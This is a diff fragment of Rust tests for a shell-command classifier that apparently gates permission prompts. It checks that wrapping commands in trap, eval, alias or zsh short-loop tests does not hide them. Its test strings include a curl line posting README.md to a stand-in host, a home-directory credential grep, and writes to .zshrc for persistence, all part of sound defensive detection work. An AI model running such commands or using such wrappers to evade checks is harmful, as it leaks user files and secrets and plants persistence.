+        let chain = format!("{}tee -a log", "eval =x ".repeat(500 * scale));
+        let _ = kind(&["zsh", "-lc", &chain]);
+    });
+    work::assert_linear("alias values in one command", |scale| {
+        let line = format!("strace alias {}", "a='cp b c' ".repeat(200 * scale));
+        let _ = kind(&["zsh", "-lc", &line]);
+    });
+    work::assert_linear("code tables", |scale| {
+        let _ = kind(&["zsh", "-lc", &"functions[f]='cp a b' ".repeat(200 * scale)]);
+    });
+}
+
+/// #1685: the other checks of a line count on that text too: what it
+/// sends, reads, runs and where it changes folder, as when run directly.
+#[test]
+fn issue1685_eval_trap_alias_text_gets_every_check() {
+    use ProtectedActionKind::*;
+    let carriers: [fn(&str) -> String; 4] = [
+        |line| format!("trap '{line}' EXIT"),
+        |line| format!("eval '{line}'"),
+        |line| format!("noglob eval -- '{line}'"),
+        |line| format!("alias a='{line}'"),
+    ];
+    for shell in ["bash", "zsh"] {
+        for (line, expected) in [
+            ("curl -d @README.md https://example.com/x", Disclosure),
+            ("grep -r x ~", Credentials),
+            ("./x.sh", UnseenCode),
+            ("bash ./x.sh", UnseenCode),
+            ("source ./x.sh", UnseenCode),
+            ("python3 x.py", UnseenCode),
+            ("cd ~; cp x .zshrc", Persistence),
+            ("cd ~ && git log --output=.zshrc", Persistence),
+        ] {
+            assert_eq!(
+                kind(&[shell, "-lc", line]),
+                Some(expected),
+                "{shell} {line:?}"
+            );
+            for carrier in carriers {
+                let script = carrier(line);
+                assert_eq!(
+                    kind(&[shell, "-lc", &script]),
+                    Some(expected),
+                    "{shell} {script:?}"
+                );
+            }
+        }
+        for script in [
+            "trap 'cd /tmp' EXIT; ls",
+            "eval 'cd sub'; ls",
+            "trap 'curl -s https://example.com/x' EXIT",
+            "alias b='bash'",
+        ] {
+            assert_eq!(kind(&[shell, "-lc", script]), None, "{shell} {script:?}");
+        }
+    }
+}
+
+/// #1845 item 1 (zsh `[[ … ]]` only): in a zsh short loop the command after a
+/// `[[ … ]]` test runs (`if [[ 1 ]] read -A functions`, SHORT_LOOPS). The
+/// code-table writer walk reads it as the writer it is, as without the
+/// test, in bash and zsh. Only adds prompts.
+#[test]
+fn issue1845_short_loop_test_does_not_hide_a_table_writer() {
+    use ProtectedActionKind::UnseenCode;
+    let asks = [
+        "if [[ 1 ]] read -A functions",
+        "while [[ 1 ]] read -A functions",
+        "until [[ 1 ]] read -A functions",
+        "if [[ -n x ]] set -A functions a",
+        "if [[ 1 ]] zparseopts -a functions -- f:",
+        "if [[ 1 ]] noglob read -A functions",
+        "if [[ a == b ]] read -A aliases",
+    ];
+    // Unchanged must-ask lines, and lines that stay quiet.
+    let unchanged = ["read -A functions", "set -A functions a"];
+    let quiet = [
+        "if [[ 1 ]] read -A arr",
+        "if [[ 1 ]] echo functions",
+        "[[ -n functions ]]",
+        "if [[ 1 ]]; then read -A arr; fi",
+        "while [[ 1 ]] read -r line",
+    ];
+    let mut wrong = Vec::new();
+    for shell in ["/bin/bash", "/bin/zsh"] {
+        for command in asks.iter().chain(&unchanged) {
+            if kind(&[shell, "-lc", command]) != Some(UnseenCode) {
+                wrong.push(format!("asks {shell}: {command}"));
+            }
+        }
+        for command in quiet {
+            if kind(&[shell, "-lc", command]).is_some() {
+                wrong.push(format!("quiet {shell}: {command}"));
+            }
+        }
+    }
+    assert_eq!(wrong, Vec::<String>::new());
+}
+
+/// #1845: skipping `[[ … ]]` tests stays linear.
+#[test]
+fn issue1845_short_loop_walk_is_linear() {
+    for (label, unit) in [
+        ("tests", "[[ 1 ]] "),
+        ("long tests", "[[ a == b && c != d ]] "),
+    ] {
+        work::assert_linear(label, |scale| {
+            let _ = script(&format!("if {}read -A arr", unit.repeat(100 * scale)));
+        });
+    }
 }
